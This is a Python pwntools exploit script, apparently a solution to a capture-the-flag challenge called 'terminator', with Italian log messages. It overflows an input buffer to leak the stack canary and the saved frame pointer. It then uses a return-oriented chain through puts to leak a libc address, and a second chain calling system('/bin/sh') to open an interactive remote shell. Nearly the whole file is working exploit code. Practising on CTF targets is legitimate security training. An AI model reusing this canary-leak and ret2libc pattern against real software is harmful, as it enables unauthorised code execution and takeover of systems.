#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template terminator '--host=terminator.challs.olicyber.it' '--port=10307'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'terminator_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'terminator.challs.olicyber.it'
port = int(args.PORT or 10307)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

def get_canary():
    io.sendlineafter(b"> ", b"A" * 55)
    io.recvline()
    io.recvline()
    canary_bp = io.recvline()
    string_canary = b"\x00" + canary_bp[:7]
    bp = canary_bp[7:13]
    return int.from_bytes(string_canary, byteorder="little"), int.from_bytes(bp, byteorder="little") - 96

exe = context.binary = ELF("terminator_patched")
libc = ELF("libc.so.6")

io = start()
canary, buffer = get_canary()

log.success(f"indirizzo del buffer: {hex(buffer)}")
log.success(f"canary: {hex(canary)}")

step1 = flat(
    0x0,  
    p64(0x4012fb), #pop rdi, ret; 
    p64(exe.got.puts),
    p64(exe.plt.puts),
    p64(exe.sym.main)
)

step1 = step1.ljust(56, b'A')

step1 += flat(
    canary.to_bytes(8, "little"),
    buffer.to_bytes(8, "little")
)

io.sendafter(b"> ", step1)
io.recvline()

indirizzo_puts = int.from_bytes(io.recvline()[:-1], byteorder="little")

log.success(f"indirizzo dei puts: {hex(indirizzo_puts)}")

libc.address = indirizzo_puts - libc.sym.puts

log.success(f"base della libc: {hex(libc.address)}")

canary, buffer = get_canary()

log.success(f"indirizzo del buffer (secondo main): {hex(buffer)}")

step2 = flat(
    0x0, 
    p64(0x4012fb), #pop rdi, ret; 
    p64(0x1d8698 + libc.address), #p64(next(libc.search(b"/bin/sh"))),
    p64(0x401016), #ret
    p64(libc.sym.system) #0x51a40 + libc.address
)
        
step2 = step2.ljust(56, b"A")

step2 += flat(
    canary.to_bytes(8, "little"),
    buffer.to_bytes(8, "little")    
)

log.success(f"indirizzo di system: {hex(libc.sym.system)}")

io.sendlineafter(b"> ", step2)

#"/bin/sh" -> 0x1d8698 -> strings -a -t x libc.so.6 | grep "/bin/sh"
#system()  -> 0x00050d60 -> rabin2 -s libc.so.6 | grep system

io.interactive()